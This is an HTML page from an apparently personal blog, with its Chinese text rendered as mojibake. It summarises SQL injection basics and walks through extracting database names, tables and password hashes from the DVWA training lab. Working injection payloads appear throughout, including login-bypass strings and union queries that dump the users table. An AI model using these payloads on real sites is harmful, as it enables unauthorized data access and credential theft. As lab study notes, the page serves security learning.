<html>
  <head>
    <meta charset="utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>ğŸ˜æ¸—é€åŸºç¡€æ€»ç»“ | xiaoguai</title>
<link rel="shortcut icon" href="https://xiaoguai69.github.io/favicon.ico?v=1651985537552">
<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
<link rel="stylesheet" href="https://xiaoguai69.github.io/styles/main.css">
<link rel="alternate" type="application/atom+xml" title="ğŸ˜æ¸—é€åŸºç¡€æ€»ç»“ | xiaoguai - Atom Feed" href="https://xiaoguai69.github.io/atom.xml">
<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">



    <meta name="description" content="ä¸€ï¼šsqlæ³¨å…¥
ä»€ä¹ˆæ˜¯sqlæ³¨å…¥ï¼Ÿï¼Ÿï¼Ÿ
å°±æ˜¯æŒ‡webåº”ç”¨ç¨‹åºåœ¨å¯¹ç”¨æˆ·è¾“å…¥çš„åˆæ³•æ€§æ²¡æœ‰è¿›è¡Œä¸¥æ ¼åˆ¤æ–­æˆ–è¿‡æ»¤ä¸ä¸¥æ ¼ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥é¢å¤–æ·»åŠ sqlè¯­å¥ï¼Œä»¥æ­¤æ¬ºéª—æœåŠ¡å™¨è¾¾åˆ°æ‰§è¡Œéæˆæƒçš„ä»»æ„æŸ¥è¯¢çš„åŠ¨ä½œ
â… ï¼šæ•°æ®åº“åŸºç¡€
sqlä¸­çš„æ³¨é‡Š
create da..." />
    <meta name="keywords" content="æ¸—é€,å®‰å…¨" />
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
    <script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
  </head>
  <body>
    <div class="main">
      <div class="main-content">
        <div class="site-header">
  <a href="https://xiaoguai69.github.io">
  <img class="avatar" src="https://xiaoguai69.github.io/images/avatar.png?v=1651985537552" alt="">
  </a>
  <h1 class="site-title">
    xiaoguai
  </h1>
  <p class="site-description">
    ç›å¡å·´å¡
  </p>
  <div class="menu-container">
    
      
        <a href="/" class="menu">
          é¦–é¡µ
        </a>
      
    
      
        <a href="/archives" class="menu">
          å½’æ¡£
        </a>
      
    
      
        <a href="/tags" class="menu">
          æ ‡ç­¾
        </a>
      
    
      
        <a href="/post/about" class="menu">
          å…³äº
        </a>
      
    
  </div>
  <div class="social-container">
    
      
    
      
    
      
    
      
    
      
    
  </div>
</div>

        <div class="post-detail">
          <article class="post">
            <h2 class="post-title">
              ğŸ˜æ¸—é€åŸºç¡€æ€»ç»“
            </h2>
            <div class="post-info">
              <span>
                2022-05-08
              </span>
              <span>
                44 min read
              </span>
              
                <a href="https://xiaoguai69.github.io/tag/0GoWCZs8a/" class="post-tag">
                  # æ¸—é€
                </a>
              
                <a href="https://xiaoguai69.github.io/tag/B7B6gwOGS2/" class="post-tag">
                  # å®‰å…¨
                </a>
              
            </div>
            
            <div class="post-content-wrapper">
              <div class="post-content">
                <h1 id="ä¸€sqlæ³¨å…¥">ä¸€ï¼š<strong>sqlæ³¨å…¥</strong></h1>
<h5 id="ä»€ä¹ˆæ˜¯sqlæ³¨å…¥">ä»€ä¹ˆæ˜¯sqlæ³¨å…¥ï¼Ÿï¼Ÿï¼Ÿ</h5>
<p><code>å°±æ˜¯æŒ‡webåº”ç”¨ç¨‹åºåœ¨å¯¹ç”¨æˆ·è¾“å…¥çš„åˆæ³•æ€§æ²¡æœ‰è¿›è¡Œä¸¥æ ¼åˆ¤æ–­æˆ–è¿‡æ»¤ä¸ä¸¥æ ¼ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥é¢å¤–æ·»åŠ sqlè¯­å¥ï¼Œä»¥æ­¤æ¬ºéª—æœåŠ¡å™¨è¾¾åˆ°æ‰§è¡Œéæˆæƒçš„ä»»æ„æŸ¥è¯¢çš„åŠ¨ä½œ</code></p>
<h2 id="iæ•°æ®åº“åŸºç¡€">â… ï¼šæ•°æ®åº“åŸºç¡€</h2>
<h4 id="sqlä¸­çš„æ³¨é‡Š">sqlä¸­çš„æ³¨é‡Š</h4>
<pre><code class="language-sql">create database  123        --åˆ›å»ºæ•°æ®åº“123'     --æ˜¯ä¸€ä¸ªå•è¡Œæ³¨é‡Š
/**/               /*è¿™æ˜¯åˆ›å»ºæ•°æ®åº“ï¼Œè¿™ä¸ªæ˜¯ä¸€ä¸ªå¤šè¡Œæ³¨é‡Š*/
#                  æ³¨é‡Šåè¾¹çš„
</code></pre>
<h4 id="sqlä¸­é“¾æ¥å­—ç¬¦ä¸²çš„å‡½æ•°">sqlä¸­é“¾æ¥å­—ç¬¦ä¸²çš„å‡½æ•°</h4>
<p><a href="https://links.jianshu.com/go?to=https%3A%2F%2Fbaijiahao.baidu.com%2Fs%3Fid%3D1595349117525189591%26wfr%3Dspider%26for%3Dpc">concat(),concat_ws()ä¸åŠgroup_concat()çš„ç”¨æ³•</a></p>
<p><code>concat(str1,str2,â€¦)</code>â€”â€”æ²¡æœ‰åˆ†éš”ç¬¦åœ°è¿æ¥å­—ç¬¦ä¸²</p>
<p><code>concat_ws(separator,str1,str2,â€¦)</code>â€”â€”å«æœ‰åˆ†éš”ç¬¦åœ°è¿æ¥å­—ç¬¦ä¸²</p>
<p><code>group_concat(str1,str2,â€¦)</code>â€”â€”è¿æ¥ä¸€ä¸ªç»„çš„æ‰€æœ‰å­—ç¬¦ä¸²ï¼ŒçŸ¥é“è¿™ä¸‰ä¸ªå‡½æ•°èƒ½ä¸€æ¬¡æ€§æŸ¥å‡ºæ‰€æœ‰ä¿¡æ¯å°±è¡Œäº†ã€‚</p>
<h3 id="1æ³¨å…¥ç®€ä»‹">â‘ æ³¨å…¥ç®€ä»‹</h3>
<ul>
<li>å›æ˜¾æ­£å¸¸---&gt; è”åˆæŸ¥è¯¢ union select</li>
<li>å›æ˜¾æŠ¥é”™---&gt; Duplicate entry()<br>
extractvalue()<br>
ã€€ã€€       updatexml()</li>
<li>ç›²æ³¨    ---&gt;å¸ƒå°”å‹ç›²æ³¨<br>
åŸºäºæ—¶é—´çš„ç›²æ³¨sleep()</li>
</ul>
<h4 id="sqlæ³¨å…¥åŸç†">sqlæ³¨å…¥åŸç†</h4>
<p>æ¶æ„çš„æŸ¥è¯¢è¯­å¥æ‰§è¡Œï¼Œæ˜¯æŒ‡webåº”ç”¨ç¨‹åºå¯¹ç”¨æˆ·è¾“å…¥æ•°æ®çš„åˆæ³•æ€§æ²¡æœ‰åˆ¤æ–­æˆ–è¿‡æ»¤ä¸ä¸¥ï¼Œæ”»å‡»è€…å¯ä»¥åœ¨webåº”ç”¨ç¨‹åºä¸­äº‹å…ˆå®šä¹‰å¥½çš„æŸ¥è¯¢è¯­å¥çš„ç»“å°¾ä¸Šæ·»åŠ é¢å¤–çš„SQLè¯­å¥ï¼Œæ¥å¾—åˆ°æ•°æ®åº“å†…çš„ä¿¡æ¯</p>
<h4 id="æ ¹æ®sqlæ•°æ®åˆ†ç±»">æ ¹æ®sqlæ•°æ®åˆ†ç±»</h4>
<h5 id="1-æ•´å½¢æ³¨å…¥">1ã€æ•´å½¢æ³¨å…¥</h5>
<h5 id="2-å­—ç¬¦å‹æ³¨å…¥">2ã€å­—ç¬¦å‹æ³¨å…¥</h5>
<h4 id="æ ¹æ®sqlæ³¨å…¥è¯­æ³•åˆ†ç±»">æ ¹æ®sqlæ³¨å…¥è¯­æ³•åˆ†ç±»</h4>
<p>btuseï¼Œå¯ä»¥æ ¹æ®è¿™äº”ä¸ªå­—æ¯è¿›è¡Œåˆ’åˆ†</p>
<h5 id="1-å¸ƒå°”æ³¨å…¥boolean-based-blind-sql-injection">1ã€å¸ƒå°”æ³¨å…¥ï¼ˆBoolean-based blind SQL injectionï¼‰</h5>
<p>ä¸ä¼šè¿”å›ç»“æœï¼Œåªèƒ½å¾—åˆ°æ˜¯æˆ–è€…å¦</p>
<pre><code class="language-sql">#å¸¸ç”¨å‡½æ•°
length(str)     #è¿”å›strå­—ç¬¦ä¸²çš„é•¿åº¦ã€‚
substr(str, pos, len)   #å°†strä»posä½ç½®å¼€å§‹æˆªå–lené•¿åº¦çš„å­—ç¬¦è¿› è¡Œè¿”å›ã€‚æ³¨æ„è¿™é‡Œçš„posä½ç½®æ˜¯ä»1å¼€å§‹çš„ï¼Œä¸æ˜¯æ•°ç»„çš„0å¼€å§‹
mid(str,pos,len) #è·Ÿä¸Šé¢çš„ä¸€æ ·ï¼Œæˆªå–å­—ç¬¦ä¸²
ascii(str)     #è¿”å›å­—ç¬¦ä¸²strçš„æœ€å·¦é¢å­—ç¬¦çš„ASCIIä»£ç å€¼ã€‚
ord(str)         #åŒä¸Šï¼Œè¿”å›asciiç 
if(a,b,c)          #aä¸ºæ¡ä»¶ï¼Œaä¸ºtrueï¼Œè¿”å›bï¼Œå¦åˆ™è¿”å›cï¼Œå¦‚if(1&gt;2,1,0),è¿”å›0
limit       #è¿”å›a+1åˆ°a+bè¡Œçš„æ•°æ® 

#å¸¸ç”¨è¯­å¥
1.é¦–å…ˆæˆ‘ä»¬éœ€è¦åˆ¤æ–­æ•°æ®åº“é•¿åº¦ 
' or Length(database()) = 8 #è¿”å›trueè¯´æ˜æ•°æ®åº“é•¿åº¦ä¸º8
2.è·å–æ•°æ®åº“åå­—
' or ord(mid(database(),1,1)) ='ascillå€¼'#
ä¾æ¬¡è·å–
3.è·å–è¡¨çš„æ€»æ•°
' or (select count(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database() )= 2#
4.è·å–è¡¨çš„é•¿åº¦(ç¬¬ä¸€ä¸ªè¡¨)
' or (select length(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database() limit 0,1 )= (çŒœæµ‹å¾—é•¿åº¦)#
5.è·å–è¡¨çš„å†…å®¹
' or  mid((select TABLE_NAME from information_schema.TABLES where 
TABLE_SCHEMA=database() limit 0,1),1,1)   = 'a' #
6.è·å–è¡¨çš„å­—æ®µçš„æ€»æ•°
' or  (select count(COLUMN_NAME) from information_schema.COLUMNS where TABLE_NAME=è¡¨å ) = 8#8è¿”å›trueè¯´æ˜æœ‰8ä¸ªè¡¨
ä¾æ¬¡ç±»æ¨,æœ€åæ¨å‡ºå†…å®¹ã€‚å› ä¸ºæ˜¯ç›²çŒœæ‰€ä»¥åªèƒ½è¿™æ ·ä¸€ä¸ªä¸€ä¸ªå»æ¨æ‰‹å·¥æ¯”è¾ƒéº»çƒ¦ é€šå¸¸ä½¿ç”¨sqlmapè¿›è¡Œæ³¨å…¥

</code></pre>
<h5 id="2-æ—¶é—´æ³¨å…¥time-based-blind-sql-injection">2ã€æ—¶é—´æ³¨å…¥ï¼ˆTime-based blind SQL injectionï¼‰</h5>
<p>å¯ä»¥æ ¹æ®è¿”å›æ—¶é—´é•¿çŸ­</p>
<pre><code class="language-sql">åœ¨MYSQLä¸­æœ‰ä¸€ä¸ªå‡½æ•°ï¼šsleepï¼ˆdurationï¼‰,è¿™ä¸ªå‡½æ•°çš„æ„è¯†æ˜¯åœ¨durationå‚æ•°ç»™å®šçš„ç§’æ•°ä¹‹åè¿è¡Œè¯­å¥ï¼Œå¦‚ä¸‹SQLè¯­å¥ï¼š

select  * from  users where id=1 and sleep(3);    /* 3ç§’ä¹‹åæ‰§è¡ŒSQLè¯­å¥*/

#å¸¸ç”¨å‚æ•°
sleep()/å»¶è¿Ÿå‡½æ•°
if(condition,true,false)/è‹¥æ¡ä»¶ä¸ºçœŸ è¿”å›trueï¼Œè‹¥æ¡ä»¶ä¸ºå‡ è¿”å›false
substring(&quot;string&quot;,strart,length)


å¸¸ç”¨è¯­å¥

</code></pre>
<h5 id="3-è”åˆæ³¨å…¥union-query-sql-injection">3ã€è”åˆæ³¨å…¥ï¼ˆUnion query SQL injectionï¼‰</h5>
<p>è¿‡ç¨‹ï¼š</p>
<h5 id="4-å¤šè¯­å¥æŸ¥è¯¢æ³¨å…¥stacted-queries-sql-injection">4ã€å¤šè¯­å¥æŸ¥è¯¢æ³¨å…¥ï¼ˆStacted queries SQL injectionï¼‰</h5>
<p>è¿‡ç¨‹ï¼š</p>
<h5 id="5-æŠ¥é”™æ³¨å…¥error-based-sql-injection">5ã€æŠ¥é”™æ³¨å…¥ï¼ˆError-based SQL injectionï¼‰</h5>
<p>è¿‡ç¨‹ï¼š</p>
<h4 id="å…¶ä»–ç§ç±»æ³¨å…¥æ–¹å¼">å…¶ä»–ç§ç±»æ³¨å…¥æ–¹å¼</h4>
<h5 id="ç›²æ³¨">ç›²æ³¨</h5>
<h6 id="åŸºäºæ—¶é—´çš„ç›²æ³¨">åŸºäºæ—¶é—´çš„ç›²æ³¨</h6>
<h3 id="å‘ç°æ³¨å…¥ç‚¹">å‘ç°æ³¨å…¥ç‚¹</h3>
<h4 id="1-ä½¿ç”¨æ¼æ´æ‰«æå·¥å…·">1ã€ä½¿ç”¨æ¼æ´æ‰«æå·¥å…·</h4>
<p>OWASP ZAPã€Dç›¾ã€seay</p>
<p>ä¸‡èƒ½å¯†ç </p>
<pre><code class="language-sql">1' or 1=1 # ç”¨æˆ·åå’Œå¯†ç éƒ½å¯  
' or '1'='1' -- 

1' or '1'='1 å¯†ç æ‰å¯
</code></pre>
<h4 id="2-ä½¿ç”¨è°·æ­Œhackingå¯»æ‰¾">2ã€ä½¿ç”¨è°·æ­Œhackingå¯»æ‰¾</h4>
<p>hackè¯­æ³•ï¼š</p>
<h2 id="iiå°è¯•sqlæ³¨å…¥">â…¡ï¼šå°è¯•sqlæ³¨å…¥</h2>
<h3 id="1-æ‰‹å·¥æ³¨å…¥æ€è·¯">1ã€æ‰‹å·¥æ³¨å…¥æ€è·¯</h3>
<p>1.åˆ¤æ–­æ˜¯å¦å­˜åœ¨æ³¨å…¥ï¼Œæ³¨å…¥æ˜¯å­—ç¬¦å‹è¿˜æ˜¯æ•°å­—å‹<br>
2.çŒœè§£ SQL æŸ¥è¯¢è¯­å¥ä¸­çš„å­—æ®µæ•°<br>
3.ç¡®å®šæ˜¾ç¤ºçš„å­—æ®µé¡ºåº<br>
4.è·å–å½“å‰æ•°æ®åº“<br>
5.è·å–æ•°æ®åº“ä¸­çš„è¡¨<br>
6.è·å–è¡¨ä¸­çš„å­—æ®µå<br>
7.æ˜¾ç¤ºå­—æ®µä¿¡æ¯</p>
<figure data-type="image" tabindex="1"><img src="./images/%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93/1.png" alt="img" loading="lazy"></figure>
<h3 id="2-å¤ç°">2ã€å¤ç°</h3>
<p>åŸºäºDVWA</p>
<h4 id="1-é¦–å…ˆ-åˆ¤æ–­æ˜¯å¦å­˜åœ¨æ³¨å…¥å­˜åœ¨çš„æ³¨å…¥ç‚¹æ˜¯å­—ç¬¦å‹å’Œæ•°å­—å‹">1ã€é¦–å…ˆ åˆ¤æ–­æ˜¯å¦å­˜åœ¨æ³¨å…¥ï¼Œå­˜åœ¨çš„æ³¨å…¥ç‚¹æ˜¯å­—ç¬¦å‹å’Œæ•°å­—å‹</h4>
<p><code>å­—ç¬¦å‹å’Œæ•°å­—å‹æœ€å¤§åŒºåˆ«: æ•°å­—å‹ä¸éœ€è¦å•å¼•å·æ¥é—­åˆï¼Œè€Œå­—ç¬¦ä¸²ä¸€èˆ¬éœ€è¦é€šè¿‡å•å¼•å·æ¥é—­åˆçš„</code><br>
<code>å³ï¼š</code><br>
<code>æ•°å­—å‹ï¼šselect * from table where id =$id</code><br>
<code>å­—ç¬¦å‹ï¼šselect * from table where id =â€˜$idâ€™</code></p>
<p>åˆ¤æ–­æ˜¯å¦ä¸ºæ•°å­—å‹</p>
<pre><code class="language-sql">1 and 1 = 1     #æ°¸çœŸ

1 and 1 = 2    #æ°¸å‡

è‹¥ä¸æŠ¥é”™ï¼Œåˆ™ä¸ºæ•°å­—å‹
</code></pre>
<p>åˆ¤æ–­æ˜¯å¦ä¸ºå­—ç¬¦å‹</p>
<pre><code class="language-sql">1' and ' 1' =' 1 
1' and ' 1' =' 2
1' or  ' 1' =' 2
è‹¥é¡µé¢æ­£å¸¸ï¼Œåˆ™ä¸ºå­—ç¬¦å‹
</code></pre>
<p>lowæºç </p>
<pre><code class="language-sql">SELECT first_name, last_name FROM users WHERE user_id = '$id';
</code></pre>
<p>å½“æˆ‘ä»¬è¾“å…¥ 1 æ—¶ï¼Œæ­¤sqlè¯­å¥å³æ˜¯</p>
<pre><code class="language-sql">SELECT first_name, last_name FROM users WHERE user_id = '1'
</code></pre>
<p>æˆ‘ä»¬è¿›è¡Œåˆ¤æ–­æ˜¯é‚£ç§æ³¨å…¥æ–¹å¼</p>
<p>å½“æµ‹è¯•åˆ°<code>1 'and '1' = '1</code>   æ—¶ æŠ¥é”™ï¼Œæ‰€ä»¥lowçº§åˆ«ä¸ºå­—ç¬¦å‹æ³¨å…¥</p>
<h4 id="2çŒœè§£-sql-æŸ¥è¯¢è¯­å¥ä¸­çš„å­—æ®µæ•°">2.çŒœè§£ SQL æŸ¥è¯¢è¯­å¥ä¸­çš„å­—æ®µæ•°</h4>
<pre><code class="language-sql">1' or 1=1 order by 1 #    --æŸ¥è¯¢æˆåŠŸ  ã€order by x å¯¹ç¬¬å‡ åˆ—è¿›è¡Œæ’åºã€‘1'  order by 1 #  id=â€˜1â€˜  #â€™ æ³¨é‡Š
1' or 1=1 order by 2 #     --æŸ¥è¯¢æˆåŠŸ
1' or 1=1 order by 3 #     --æŸ¥è¯¢å¤±è´¥
</code></pre>
<p>è¯´æ˜æ‰§è¡Œçš„SQLæŸ¥è¯¢è¯­å¥ä¸­åªæœ‰ä¸¤ä¸ªå­—æ®µï¼Œå³è¿™é‡Œçš„First nameã€Surnameã€‚</p>
<p>ï¼ˆè¿™é‡Œä¹Ÿå¯ä»¥é€šè¿‡è¾“å…¥union select 1,2,3...æ¥çŒœè§£å­—æ®µæ•°ï¼‰</p>
<h4 id="3-ç¡®å®šæ˜¾ç¤ºå­—æ®µçš„é¡ºåº">3ã€ç¡®å®šæ˜¾ç¤ºå­—æ®µçš„é¡ºåº</h4>
<pre><code class="language-sql">1' union select 1,2 #
</code></pre>
<p>UNION æ“ä½œç¬¦åˆå¹¶ä¸¤ä¸ªæˆ–å¤šä¸ª SELECT è¯­å¥çš„ç»“æœã€‚</p>
<p>selectï¼šselectè¯­å¥ç”¨äºä»æ•°æ®åº“ä¸­é€‰å–æ•°æ®ï¼šä¾‹å¦‚ä¸€ä¸ªç½‘ç«™çš„å‚æ•°ä¼ é€’æ‰§è¡Œçš„æŸ¥è¯¢æœ‰3ä¸ªå­—æ®µï¼Œå¾ˆå¯èƒ½è¿™äº›å­—æ®µä¸æ˜¯éƒ½æ˜¾ç¤ºåœ¨ç½‘é¡µå‰ç«¯çš„ï¼Œå‡å¦‚å…¶ä¸­çš„1æˆ–2ä¸ªå­—æ®µçš„æŸ¥è¯¢ç»“æœæ˜¯ä¼šè¿”å›åˆ°å‰ç«¯çš„ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±éœ€è¦çŸ¥é“è¿™3ä¸ªå­—æ®µä¸­å“ªä¸¤ä¸ªç»“æœä¼šå›æ˜¾ï¼Œè¿™ä¸ªè¿‡ç¨‹ç›¸å½“äºæ‰¾åˆ°æ•°æ®åº“ä¸å‰ç«¯æ˜¾ç¤ºçš„é€šé“ã€‚å¦‚æœæˆ‘ä»¬ç›´æ¥è¾“å…¥æŸ¥è¯¢å­—æ®µè¿›è¡ŒæŸ¥è¯¢ï¼Œè¯­å¥ä¼šéå¸¸å†—é•¿ï¼Œè€Œä¸”å¾ˆå¯èƒ½è¿˜éœ€è¦åšå¾ˆå¤šæ¬¡æµ‹è¯•ï¼Œè¿™æ—¶å€™æˆ‘ä»¬åˆ©ç”¨ä¸€ä¸ªç®€å•çš„select 1,2,3ï¼Œæ ¹æ®æ˜¾ç¤ºåœ¨é¡µé¢ä¸Šçš„æ•°å­—å°±å¯ä»¥çŸ¥é“å“ªä¸ªæ•°å­—æ˜¯è¿™ä¸ªâ€œé€šé“â€ï¼Œé‚£ä¹ˆæˆ‘ä»¬åªéœ€è¦æŠŠè¿™ä¸ªæ•°å­—æ”¹æˆæˆ‘ä»¬æƒ³æŸ¥è¯¢çš„å†…å®¹ï¼ˆå¦‚id,passwordï¼‰ï¼Œå½“æ•°æ®çˆ†ç ´æˆåŠŸåï¼Œå°±ä¼šåœ¨çª—å£æ˜¾ç¤ºæˆ‘ä»¬æƒ³è¦çš„ç»“æœã€‚<a href="https://blog.csdn.net/weixin_44840696/article/details/89166154">SELECT 1,2,3â€¦çš„å«ä¹‰åŠå…¶åœ¨SQLæ³¨å…¥ä¸­çš„ç”¨æ³•</a></p>
<h4 id="4-è·å–å½“å‰æ•°æ®åº“">4ã€è·å–å½“å‰æ•°æ®åº“</h4>
<pre><code class="language-sql">1' union select 1,database()#
#è¿™æ ·æˆ‘ä»¬å°±ä¼šå¾—åˆ°æˆ‘ä»¬å½“å‰æ•°æ®åº“ï¼šå½“ç„¶è¿™ä¸ªæ•°å­—æ²¡å•¥å«ä¹‰
1' union select database(),2#    --å½“æˆ‘ä»¬è¿™æ ·è¾“å…¥å¾—åˆ°çš„ç»“æœæ˜¯ä¸€æ ·çš„  
</code></pre>
<h4 id="5-è·å–æ•°æ®åº“ä¸­çš„è¡¨">5ã€è·å–æ•°æ®åº“ä¸­çš„è¡¨</h4>
<pre><code class="language-sql">1' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #      --è¿™æ˜¯ä¸€æ•´ä¸ª

1' union select 1,table_name from information_schema.tables where table_schema='dvwa' #                   --ä¸¤ç§æ–¹å¼éƒ½å¯ä»¥ï¼Œä¸‹è¾¹ç¬¦åˆæˆ‘ä»¬æˆ¿å‰ç¯å¢ƒï¼Œä¸Šè¾¹æ¯”è¾ƒé€šç”¨
</code></pre>
<p>æ­¤å¤„ç”¨group_concatï¼šå¯ç”¨concatå‡½æ•°æ›¿ä»£ï¼Œåªæ˜¯ä¸é›†ä¸­åœ¨ä¸€èµ·è€Œå·²</p>
<p>group_concatï¼šå¯ä»¥æŠŠåŒä¸€åˆ†ç»„ä¸­çš„å€¼é“¾æ¥åœ¨ä¸€èµ·ï¼Œ</p>
<p>æ­¤ç”¨äº†information_schema.tableså½“ä¸­å­˜å‚¨äº†æ•°æ®è¡¨çš„ å…ƒæ•°æ®ä¿¡æ¯ä»‹ç»ï¼š</p>
<table>
<thead>
<tr>
<th>å­—æ®µ</th>
<th>å«ä¹‰</th>
</tr>
</thead>
<tbody>
<tr>
<td>Table_catalog</td>
<td>æ•°æ®è¡¨ç™»è®°ç›®å½•</td>
</tr>
<tr>
<td>Table_schema</td>
<td>æ•°æ®è¡¨æ‰€å±çš„æ•°æ®åº“å</td>
</tr>
<tr>
<td>Table_name</td>
<td>è¡¨åç§°</td>
</tr>
<tr>
<td>Table_type</td>
<td>è¡¨ç±»å‹[system view|base table]</td>
</tr>
<tr>
<td>Engine</td>
<td>ä½¿ç”¨çš„æ•°æ®åº“å¼•æ“[MyISAM|CSV|InnoDB]</td>
</tr>
<tr>
<td>Version</td>
<td>ç‰ˆæœ¬ï¼Œé»˜è®¤å€¼10</td>
</tr>
<tr>
<td>Row_format</td>
<td>è¡Œæ ¼å¼[Compact|Dynamic|Fixed]</td>
</tr>
<tr>
<td>Table_rows</td>
<td>è¡¨é‡Œæ‰€å­˜å¤šå°‘è¡Œæ•°æ®</td>
</tr>
<tr>
<td>Avg_row_length</td>
<td>å¹³å‡è¡Œé•¿åº¦</td>
</tr>
<tr>
<td>Data_length</td>
<td>æ•°æ®é•¿åº¦</td>
</tr>
<tr>
<td>Max_data_length</td>
<td>æœ€å¤§æ•°æ®é•¿åº¦</td>
</tr>
<tr>
<td>Index_length</td>
<td>ç´¢å¼•é•¿åº¦</td>
</tr>
<tr>
<td>Data_free</td>
<td>ç©ºé—´ç¢ç‰‡</td>
</tr>
<tr>
<td>Auto_increment</td>
<td>åšè‡ªå¢ä¸»é”®çš„è‡ªåŠ¨å¢é‡å½“å‰å€¼</td>
</tr>
<tr>
<td>Create_time</td>
<td>è¡¨çš„åˆ›å»ºæ—¶é—´</td>
</tr>
<tr>
<td>Update_time</td>
<td>è¡¨çš„æ›´æ–°æ—¶é—´</td>
</tr>
<tr>
<td>Check_time</td>
<td>è¡¨çš„æ£€æŸ¥æ—¶é—´</td>
</tr>
<tr>
<td>Table_collation</td>
<td>è¡¨çš„å­—ç¬¦æ ¡éªŒç¼–ç é›†</td>
</tr>
<tr>
<td>Checksum</td>
<td>æ ¡éªŒå’Œ</td>
</tr>
<tr>
<td>Create_options</td>
<td>åˆ›å»ºé€‰é¡¹</td>
</tr>
<tr>
<td>Table_comment</td>
<td>è¡¨çš„æ³¨é‡Šã€å¤‡æ³¨</td>
</tr>
</tbody>
</table>
<h4 id="6-è·å–å½“å‰è¡¨ä¸­å­—æ®µå">6ã€è·å–å½“å‰è¡¨ä¸­å­—æ®µå</h4>
<pre><code class="language-sql">1' union select 1,group_concat(column_name) from information_schema.columns where table_name='users' #
1' union select 1,column_name from information_schema.columns where table_name='users' #
</code></pre>
<h4 id="7-ä¸‹è½½æ•°æ®è·å–å­—æ®µä¿¡æ¯">7ã€ä¸‹è½½æ•°æ®ï¼ˆè·å–å­—æ®µä¿¡æ¯ï¼‰</h4>
<pre><code class="language-sql">1' or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #
</code></pre>
<h2 id="iiiä½¿ç”¨sqlmapæ³¨å…¥å¾…æµ‹è¯•">â…¢ï¼šä½¿ç”¨sqlmapæ³¨å…¥ï¼ˆå¾…æµ‹è¯•ï¼‰</h2>
<p>sqlmapå¯ä»¥ä»£æ›¿æˆ‘ä»¬è¿›è¡Œå¿«é€Ÿè‡ªåŠ¨æ³¨å…¥ï¼Œsqlmapæ”¯æŒMySQL, Oracle,PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird,Sybaseå’ŒSAP MaxDBç­‰æ•°æ®åº“çš„å„ç§å®‰å…¨æ¼æ´æ£€æµ‹</p>
<h3 id="1-sqlmapä½¿ç”¨æ•™ç¨‹">1ã€sqlmapä½¿ç”¨æ•™ç¨‹</h3>
<h3 id="å…¶ä»–sqlæ³¨å…¥">å…¶ä»–sqlæ³¨å…¥</h3>
<h4 id="1-sqlç›²æ³¨">1ã€sqlç›²æ³¨</h4>
<p>â€‹	ç›²æ³¨åªä¼šæç¤ºâ€œæ˜¯â€æˆ–â€œä¸æ˜¯â€</p>
<p><strong>æ‰‹å·¥ç›²æ³¨æ­¥éª¤</strong>ï¼š</p>
<p>1.åˆ¤æ–­æ˜¯å¦å­˜åœ¨æ³¨å…¥ï¼Œæ³¨å…¥æ˜¯å­—ç¬¦å‹è¿˜æ˜¯æ•°å­—å‹<br>
2.çŒœè§£å½“å‰æ•°æ®åº“å<br>
3.çŒœè§£æ•°æ®åº“ä¸­çš„è¡¨å<br>
4.çŒœè§£è¡¨ä¸­çš„å­—æ®µå<br>
5.çŒœè§£æ•°æ®</p>
<h6 id="æ‰‹å·¥ç›²æ³¨å¸¸ç”¨å‚æ•°"><strong>æ‰‹å·¥ç›²æ³¨å¸¸ç”¨å‚æ•°</strong></h6>
<table>
<thead>
<tr>
<th style="text-align:left">å‡½æ•°</th>
<th style="text-align:left">æè¿°</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">left(å­—ç¬¦ä¸²ï¼Œæˆªå–é•¿åº¦)</td>
<td style="text-align:left">ä»å·¦è¾¹æˆªå–æŒ‡å®šé•¿åº¦çš„å­—ç¬¦ä¸²</td>
</tr>
<tr>
<td style="text-align:left">length(å­—ç¬¦ä¸²)</td>
<td style="text-align:left">è·å–å­—ç¬¦ä¸²çš„é•¿åº¦</td>
</tr>
<tr>
<td style="text-align:left">limit</td>
<td style="text-align:left">å¼ºåˆ¶selectè¯­å¥è¿”å›çš„å‚æ•°</td>
</tr>
<tr>
<td style="text-align:left">ascii(å­—ç¬¦ä¸²)</td>
<td style="text-align:left">å°†æŒ‡å®šå­—ç¬¦ä¸²è¿›è¡Œasciiç¼–ç </td>
</tr>
<tr>
<td style="text-align:left">substr(å­—ç¬¦ä¸²ï¼Œstartï¼Œæˆªå–é•¿åº¦)</td>
<td style="text-align:left">æˆªå–å­—ç¬¦ä¸²ï¼Œå¯ä»¥æŒ‡å®šèµ·å§‹ä½ç½®å’Œé•¿åº¦</td>
</tr>
<tr>
<td style="text-align:left">mid(å­—ç¬¦ä¸²ï¼Œstartï¼Œæˆªå–é•¿åº¦)</td>
<td style="text-align:left">æˆªå–å­—ç¬¦ä¸²ï¼Œå¯ä»¥æŒ‡å®šèµ·å§‹ä½ç½®å’Œé•¿åº¦</td>
</tr>
<tr>
<td style="text-align:left">count()</td>
<td style="text-align:left">è®¡ç®—æ€»æ•°ï¼Œè¿”å›åŒ¹é…æ¡ä»¶çš„è¡Œæ•°ã€‚</td>
</tr>
<tr>
<td style="text-align:left">sleep(n)</td>
<td style="text-align:left">å°†ç¨‹åºæŒ‚èµ·nç§’</td>
</tr>
<tr>
<td style="text-align:left">if(å‚æ•°1ï¼Œå‚æ•°2ï¼Œå‚æ•°3)</td>
<td style="text-align:left">å‚æ•°1ä¸ºæ¡ä»¶ï¼Œå½“å‚æ•°1è¿”å›çš„ç»“æœä¸ºtrueæ—¶ï¼Œæ‰§è¡Œå‚æ•°2ï¼Œå¦åˆ™æ‰§è¡Œå‚æ•°3</td>
</tr>
</tbody>
</table>
<h5 id="å¸ƒå°”ç›²æ³¨">å¸ƒå°”ç›²æ³¨</h5>
